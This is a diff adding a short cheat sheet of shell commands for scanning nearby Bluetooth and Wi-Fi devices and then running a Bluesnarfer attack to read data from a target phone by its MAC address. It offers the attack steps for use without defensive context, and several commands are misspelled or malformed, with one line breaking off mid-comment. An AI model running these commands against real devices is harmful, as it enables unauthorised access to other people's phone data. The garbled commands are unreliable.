@@ -1,0 +1,22 @@
+//scanning bluetooth
+lsusb
+hciconfig
+hacitool scan --info --oui
+bluelog -l
+btscanner
+l2ping mac
+fang -h
+fang -s -r 0CD6BD46D400-0CD6BD464FF
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+//attak using Bluesnarfer
+lsusb
+hciconfig
+hcitool scan
+l2ping mac
+mkdir -p /dev/blueetooth/rfcomm
+mknod -m /dev/bluetooth/rfcomm/0 c 216 0
+sdptool browse cellphonemac
+bluesnafer
+bluesanfer -C 10 -r 1-10 -b cellphonemac  (repeat until you get the phone addess
